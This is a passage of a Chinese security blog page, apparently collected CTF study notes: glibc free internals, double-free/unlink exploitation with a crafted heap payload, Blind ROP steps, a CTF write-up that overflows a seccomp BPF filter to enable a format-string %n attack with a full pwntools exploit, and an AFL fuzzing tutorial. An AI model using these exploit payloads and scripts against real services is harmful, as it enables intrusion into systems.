（检查下一块的大小是    否为合理的数值）。 
然后检查该chunk是否是由mmap分配的，
如果不是找前一个unlink合并，
就根据其下一个chunk的类型添加到unsortedbin
或者合并到top chunk中。 
接着，如果释放的chunk的大小大于一定的阀值，
就需要通过systrim缩小主分配区的大小，
或者通过heap_trim缩小非主分配区的大小。
 （检查unsortbin是否完好无损）
最后如果该chunk是由mmap的分配的，
通过munmap_chunk释放。
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.109Z"><a href="/2018/10/21/doublefree/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/doublefree/">double free</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="double-free-利用"><a href="#double-free-利用" class="headerlink" title="double free 利用"></a>double free 利用</h1><p>unlink漏洞<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure></p>
<pre><code>这里在宏中传入参数FD，BK，P分别是指向后一个，
前一个，还有当前的chunk。很经典的链表节点删除，
溢出的话导致链表被改，所以有了保护。
当前内存块的上一块内存中指向下一块内存指针和
当前内存块的下一块内存块的指向上一块内存块的指针
如果不是指向当前内存块的话，程序就会崩溃退出。
</code></pre><h1 id="漏洞的原理"><a href="#漏洞的原理" class="headerlink" title="漏洞的原理"></a>漏洞的原理</h1><pre><code>要利用Double Free的漏洞。我们就要让系统进行unlink的操作，
达到篡改指针的目的。但是一般的情况下，
我们两次释放同一块内存会被操作系统给检测出来，
怎么欺骗过操作系统才是最重要的。
</code></pre><p>假设程序申请了两个堆块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;malloc(504)</span><br><span class="line">&gt;malloc(512)</span><br></pre></td></tr></table></figure></p>
<pre><code>然后释放这2块内存。这样子我们就可以在距离
第一个指针偏移量为0x200的地方有了一个野指针。
我们留下了一个野指针p指向偏移为0x200的地方。
然后我们需要做的就是伪造chunk。再free野指针p。
首先是申请一块更大的内存，
大小应该等于我们刚才申请的内存的总和。
</code></pre><blockquote>
<p>malloc(768)<br>    最好和刚才2块内存大小总和一样，如果不一样大也也可以，<br>    就是待会伪造第二快内存块的大小的时候，<br>    要让伪造的大小等于我们申请的chunk的大小，<br>    否则会无法绕过检查。会被系统检查出double free。</p>
</blockquote>
<p>然后这是我在第二次申请的内存中填入的内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;0x0 + 0x1f9 + 0x0804bfc0 - 0xc + 0x0804bfc0 - 0x8 + &apos;a&apos;*(0x200-24) + 0x000001f8 + 0x108</span><br></pre></td></tr></table></figure>
<pre><code>接着释放野指针，除法unlink可以绕过检查，让指针指向自己前面的地址。
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.108Z"><a href="/2018/10/21/brop/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/brop/">brop</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="BROP的使用环境："><a href="#BROP的使用环境：" class="headerlink" title="BROP的使用环境："></a>BROP的使用环境：</h2><pre><code>不能直接构造ROP gadget
目标服务在崩溃后会重新运行
</code></pre><h2 id="Canary不会重置，没有ASLR"><a href="#Canary不会重置，没有ASLR" class="headerlink" title="Canary不会重置，没有ASLR"></a>Canary不会重置，没有ASLR</h2><pre><code>这是因为Blind ROP其实核心部分都是类似于爆破的概念，  
因此会不断的引起目标服务崩溃，挂起，如果崩溃后不能重新启动，  
且启动后Canary或者其他地址改变，那么之前的爆破也就无意义了。  
那么BROP每一步在做什么呢。
</code></pre><h2 id="爆破Canary："><a href="#爆破Canary：" class="headerlink" title="爆破Canary："></a>爆破Canary：</h2><pre><code>当我们获取到崩溃长度后，根据
Canary-&gt;EBP-&gt;Ret
的栈结构，我们可以开始爆破Canary，爆破的方法就是一字节一字节爆破。
</code></pre><h2 id="获取Hang-addr和PLT："><a href="#获取Hang-addr和PLT：" class="headerlink" title="获取Hang addr和PLT："></a>获取Hang addr和PLT：</h2><pre><code>随后就是找hang gadget了，这个也叫stop gadget。
这种特殊的地址，既不会造成Nginx崩溃，也不会造成Nginx返回内容，
而是让进程进入无限循环，挂起或者sleep的状态，
它是我们后面寻找BROP gadget的重要依据。
plt的原理和hang gadget很像。
在这之前我大概说一下为什么找plt的原理和hang gadget很像。
plt项是连续的，而且在0字节，和6字节之后执行的内容都会正常进入后续处理，
而不会崩溃或有返回，因此只要连续有多个16字节都会让进程block且每个16字节地址+6之后，
也会block，那么这就有可能是个plt项。
</code></pre><h2 id="找到BROP-gadget："><a href="#找到BROP-gadget：" class="headerlink" title="找到BROP gadget："></a>找到BROP gadget：</h2><pre><code>接下来，有了hang gadget，我们就可以找到BROP gadget了，这个BROPgadget，是我们组成在开头提到通过write方法dump内存的重要部分，
和ROP gadget的概念很像，为了组成这个write函数，需要三个参数，
也就是需要三个ROP gadget：
pop rdi,ret; 
pop rsi,ret;  
pop rdx,ret;
因为在64位Linux中，参数不是靠push寄存器入栈决定的，
而是由寄存器本身决定的，这三个参数对应的就是rdi，rsi和rdx寄存器中的内容。
因此我们利用hang gadget来暴力搜索这些BROPgadget，如何判断呢？
在ret后放很多hangaddr，只要命中pop ret，pop pop ret这种gadget，都会进入block状态，通过这种方法，我们找到6个pop ret，就能找到一个在linux下常见的结构，通过计算这个结构的偏移，
就能得到pop rsi,ret和pop rdi,ret了。
</code></pre><h2 id="找到strcmp-plt和write-plt"><a href="#找到strcmp-plt和write-plt" class="headerlink" title="找到strcmp plt和write plt"></a>找到strcmp plt和write plt</h2><pre><code>这一步完成后，我们就需要进行strcmp和write对应plt项的查找了，
为什么要找strcmp呢，因为strcmp的汇编功能是对rdx赋予一个长度值，
通过这种方法可以对rdx，
也就是第三个参数赋值，因为在.text字段中很难找到pop rdx,ret这样的gadget。
找这两个plt项，需要利用这两个plt项的特性，
比如strcmp就是对比两个字符串内容。如果两个字符串相等，
没有崩溃，且不相等，crash的话，这就是一个strcmp。
</code></pre><h2 id="Dump内存，执行shellcode"><a href="#Dump内存，执行shellcode" class="headerlink" title="Dump内存，执行shellcode"></a>Dump内存，执行shellcode</h2><pre><code>跳出内存完成正常攻击，
或者使用libcdatabase找出libc版本
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.107Z"><a href="/2018/10/21/bpf/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/bpf/">bpf</a></h1>
  

    </header>
    <div class="entry">
      
        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x40</span>);</span><br><span class="line">  fd = open(<span class="string">"flag.txt"</span>, <span class="number">0x80000</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x40</span>);</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">0x40</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">32</span>];</span><br><span class="line">  <span class="keyword">short</span> v19;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">char</span>* secret;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">int</span> j;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  sercet = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> (!secret)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">"secret.txt"</span>, <span class="number">0x80000</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  v8 = read(fd, secret, <span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> (v8 == <span class="number">-1</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  secret[v8] = <span class="number">0</span>;</span><br><span class="line">  close(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//seccomp BPF</span></span><br><span class="line">  v19 = <span class="number">32</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">4</span>;</span><br><span class="line">  v23 = <span class="number">21</span>;</span><br><span class="line">  v24 = <span class="number">1</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">-1073741762</span>;</span><br><span class="line">  v27 = <span class="number">6</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">32</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v35 = <span class="number">21</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">1</span>;</span><br><span class="line">  v38 = <span class="number">231</span>;</span><br><span class="line">  v39 = <span class="number">6</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">2147418112</span>;</span><br><span class="line">  v43 = <span class="number">21</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">1</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">6</span>;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v49 = <span class="number">0</span>;</span><br><span class="line">  v50 = <span class="number">2147418112</span>;</span><br><span class="line">  v51 = <span class="number">21</span>;</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v53 = <span class="number">1</span>;</span><br><span class="line">  v54 = <span class="number">2</span>;</span><br><span class="line">  v55 = <span class="number">6</span>;</span><br><span class="line">  v56 = <span class="number">0</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v58 = <span class="number">2147418112</span>;</span><br><span class="line">  v59 = <span class="number">21</span>;</span><br><span class="line">  v60 = <span class="number">0</span>;</span><br><span class="line">  v61 = <span class="number">1</span>;</span><br><span class="line">  v62 = <span class="number">1</span>;</span><br><span class="line">  v63 = <span class="number">6</span>;</span><br><span class="line">  v64 = <span class="number">0</span>;</span><br><span class="line">  v65 = <span class="number">0</span>;</span><br><span class="line">  v66 = <span class="number">2147418112</span>;</span><br><span class="line">  v67 = <span class="number">21</span>;</span><br><span class="line">  v68 = <span class="number">0</span>;</span><br><span class="line">  v69 = <span class="number">1</span>;</span><br><span class="line">  v70 = <span class="number">3</span>;</span><br><span class="line">  v71 = <span class="number">6</span>;</span><br><span class="line">  v72 = <span class="number">0</span>;</span><br><span class="line">  v73 = <span class="number">0</span>;</span><br><span class="line">  v74 = <span class="number">2147418112</span>;</span><br><span class="line">  v75 = <span class="number">6</span>;</span><br><span class="line">  v76 = <span class="number">0</span>;</span><br><span class="line">  v77 = <span class="number">0</span>;</span><br><span class="line">  v78 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">15</span>;</span><br><span class="line">  v17 = &amp;v19;</span><br><span class="line">  </span><br><span class="line">  seccomp_setup = <span class="number">0</span>;</span><br><span class="line">  v15 = &amp;v16;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">16</span>;i&gt;<span class="number">0</span>;i--) &#123;</span><br><span class="line">    v18[syscall(<span class="number">0</span>, <span class="number">0</span>, v18, <span class="number">96</span>)] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (!seccomp_setup) &#123;</span><br><span class="line">      <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">0x1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="number">0x2</span>, v15))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v11 = <span class="built_in">strlen</span>(secret) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j=<span class="number">0</span>; ;j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (v11 - <span class="number">1</span> == j)</span><br><span class="line">        <span class="keyword">goto</span> LABEL_SHOW_FLAG;</span><br><span class="line">      <span class="keyword">if</span> (secret[j] != v18[j])</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong secret :/"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(secret) == j)</span><br><span class="line">LABEL_SHOW_FLAG:</span><br><span class="line">      show_flag();</span><br><span class="line"></span><br><span class="line">    _fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1</span>, v18);</span><br><span class="line">    seccomp_setup = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>所以，二进制文件加载“secret.txt”，
如果我们发送正确的秘密，我们将会得到该标志的奖励。
我在工作目录中创建了“secret.txt”和“flag.txt”，
并在执行二进制文件时发现存在格式字符串漏洞。
我们可以用“％p％p％s”泄漏正确的秘密，
因为指向秘密的指针位于堆栈中。不那么容易:)格式字符串存在，
但输出打印到stderr。因此，不可能将其远程泄漏。
另外,启用FORTIFY_SOURCE可防止使用%n可写内存段。
您可能注意到SECCOMP过滤器正在堆栈中初始化。
我在运行时转储它并使用seccomp-tools反汇编规则
</code></pre><h1 id="bpf分析"><a href="#bpf分析" class="headerlink" title="bpf分析"></a>bpf分析</h1><pre><code>exit_group，read，open，write和close被启用。
然后，我注意到程序在缓冲区中读取了96个字符，其大小为32.在应用规则之前，我们可以在第一次读取时将缓冲区溢出到SECCOMP BPF中。我们只能写一个新的BPF，
只有64个字节。编写一个新的过滤器很容易，
它允许每个系统调用，但是这对我们无能为力。

当开始跟踪系统调用时%n，printf_chk它会打开“/ self / proc / maps”
以检查缓冲区是否位于可写段中。
我们开始深入研究glibc源代码，
并发现它：readonly-area.c。
具体来说，我们需要打开return ENOENT
或者EACCEScheck内部__readonly_area()
通过并返回1，这是绕过%n过滤 所必需的。
我们可以让SECCOMP返回一个任意的错误，
而不用ERRNO执行系统调用 
</code></pre><p>从Linux SECCOMP手册页：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SECCOMP_RET_ERRNO</span><br><span class="line">              This value results in the SECCOMP_RET_DATA portion of the fil‐</span><br><span class="line">              ter&apos;s return value being passed to user space as the errno</span><br><span class="line">              value without executing the system call.</span><br></pre></td></tr></table></figure>
<p>我使用了这个过滤器，并将最低有效16位（由常量SECCOMP_RET_DATA定义）修补为ENOENT=0x2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A != open ? ok : next</span><br><span class="line">return ERRNO</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></figure>
<pre><code>%n正在工作！但还有一小步。之前的过滤器也会阻止open(&quot;flag.txt&quot;, 0x80000)系统调用。
标志是相同的（0x80000），所以我们不能使用基于这个参数的过滤器。
然而，无论PIE被启用，哪个随机化文本地址，
我们知道“flag.txt”地址的最后一个字节是0x64 _rodata。
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A != open ? ok : next</span><br><span class="line">A = args[0]</span><br><span class="line">A &amp;= 0xff</span><br><span class="line">A == 0x64 ? ok : next</span><br><span class="line">return ERRNO</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></figure>
<h1 id="编译方法-asm"><a href="#编译方法-asm" class="headerlink" title="编译方法 asm"></a>编译方法 asm</h1><p>我用seccomp-tools编译了这个过滤器，并将其用于我的漏洞利用：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./flag_store"</span>)</span><br><span class="line"><span class="comment">#r = remote("35.198.105.104", 10000)</span></span><br><span class="line"></span><br><span class="line">bpf = <span class="string">"20000000000000001500000402000000200000001000000054000000ff00000015000100640000000600000002000500060000000000ff7f"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">r.send((<span class="string">"A"</span>*<span class="number">32</span> + bpf))</span><br><span class="line">r.recvuntil(<span class="string">"Wrong secret :/"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"%c%c%n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Wrong secret :/"</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"\x02"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          
          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-10-21T06:01:10.106Z"><a href="/2018/10/21/afl/">2018-10-21</a></time>
      
      
  
    <h1 class="title"><a href="/2018/10/21/afl/">afl</a></h1>
  

    </header>
    <div class="entry">
      
        <p>afl-fuzz技术初探<br>目录</p>
<p>安装lzma-sdk<br>安装ucl<br>安装zlib<br>编译upx</p>
<p>afl-fuzz技术初探<br>转载请注明出处:<a href="http://www.cnblogs.com/WangAoBo/p/8280352.html" target="_blank" rel="noopener">http://www.cnblogs.com/WangAoBo/p/8280352.html</a></p>
<p>参考了:</p>
<p><a href="http://pwn4.fun/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">http://pwn4.fun/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/</a></p>
<p><a href="http://blog.csdn.net/youkawa/article/details/45696317" target="_blank" rel="noopener">http://blog.csdn.net/youkawa/article/details/45696317</a></p>
<p><a href="https://stfpeak.github.io/2017/06/12/AFL-Cautions/" target="_blank" rel="noopener">https://stfpeak.github.io/2017/06/12/AFL-Cautions/</a></p>
<p><a href="http://blog.csdn.net/abcdyzhang/article/details/53487683" target="_blank" rel="noopener">http://blog.csdn.net/abcdyzhang/article/details/53487683</a></p>
<h1 id="安装afl"><a href="#安装afl" class="headerlink" title="安装afl"></a>安装afl</h1><pre><code>下载最新源码
解压并安装:
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash $make $sudo make all</span><br></pre></td></tr></table></figure>
<p>​    </p>
<h2 id="有源码的afl-fuzz"><a href="#有源码的afl-fuzz" class="headerlink" title="有源码的afl-fuzz"></a>有源码的afl-fuzz</h2><pre><code>这里以fuzz upx为例进行测试

编译upx
upx项目地址([*https://github.com/upx/upx*)
因为afl会对有源码的程序进行重新编译,因此需要修改upx的Makefile
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$git clone https://github.com/upx/upx.git</span><br><span class="line">$cd upx</span><br><span class="line">$vim Makefile</span><br><span class="line">CC = /usr/local/bin/afl-gcc #添加此句</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cd src</span><br><span class="line">$vim Makefile</span><br><span class="line">CXX    ?= /usr/local/bin/afl-g++ #将CXX改成afl-g++</span><br></pre></td></tr></table></figure>
<h3 id="安装lzma-sdk"><a href="#安装lzma-sdk" class="headerlink" title="安装lzma-sdk"></a>安装lzma-sdk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$git submodule update --init --recursive</span><br></pre></td></tr></table></figure>
<h3 id="安装ucl"><a href="#安装ucl" class="headerlink" title="安装ucl"></a>安装ucl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash $cd ucl-1.03 $./configure $make $sudo make install</span><br><span class="line">bash $export UPX_UCCLDIR=&quot;~/ucl-1.03&quot;</span><br></pre></td></tr></table></figure>
<h3 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib"></a>安装zlib</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$wget http://pkgs.fedoraproject.org/repo/pkgs/zlib/zlib-1.2.11.tar.xz/sha512/b7f50ada138c7f93eb7eb1631efccd1d9f03a5e77b6c13c8b757017b2d462e19d2d3e01c50fad60a4ae1bc86d431f6f94c72c11ff410c25121e571953017cb67/zlib-1.2.11.tar.xz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cd zlib-1.2.11/</span><br><span class="line">$./configure</span><br><span class="line">$sudo make install</span><br></pre></td></tr></table></figure>
<h3 id="编译upx"><a href="#编译upx" class="headerlink" title="编译upx"></a>编译upx</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cd ~/upx</span><br><span class="line">$make all</span><br></pre></td></tr></table></figure>
<p>此时可在/src目录下找到upx.out文件<br>对upx进行fuzz测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cd ~</span><br><span class="line">$mkdir afl_in afl_out</span><br></pre></td></tr></table></figure>
<p>afl_in存放测试用例,afl_out存放fuzz结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cp /usr/bin/file afl_in</span><br><span class="line">$afl-fuzz -i afl_in -o afl_out ~/upx/src/upx.out @@</span><br></pre></td></tr></table></figure></p>
<p>@@会代替测试样本,即相当于执行了upx.out file</p>
<p>对于从stdin获取输入的程序,可以使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># afl-fuzz -i afl_in -o afl_out ./file</span><br></pre></td></tr></table></figure></p>
<h2 id="无源码的afl-fuzz"><a href="#无源码的afl-fuzz" class="headerlink" title="无源码的afl-fuzz"></a>无源码的afl-fuzz</h2><pre><code>对无源码的程序进行fuzz一般有两种方法:
对二进制文件进行插桩
使用-n选项进行传统的fuzz测试
这里主要介绍第一种,该方法是通过afl-qemu实现的.
</code></pre><p>编译afl版的qemu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd qemu_mode </span><br><span class="line">$ ./build_qemu_support.sh</span><br></pre></td></tr></table></figure></p>
<p>另外需要把afl加入环境变量<br>例如：编辑/etc/profile文件，添加CLASSPATH变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/profile </span><br><span class="line">export CLASSPATH=./JAVA_HOME/lib;$JAVA_HOME/jre/lib</span><br></pre></td></tr></table></figure></p>
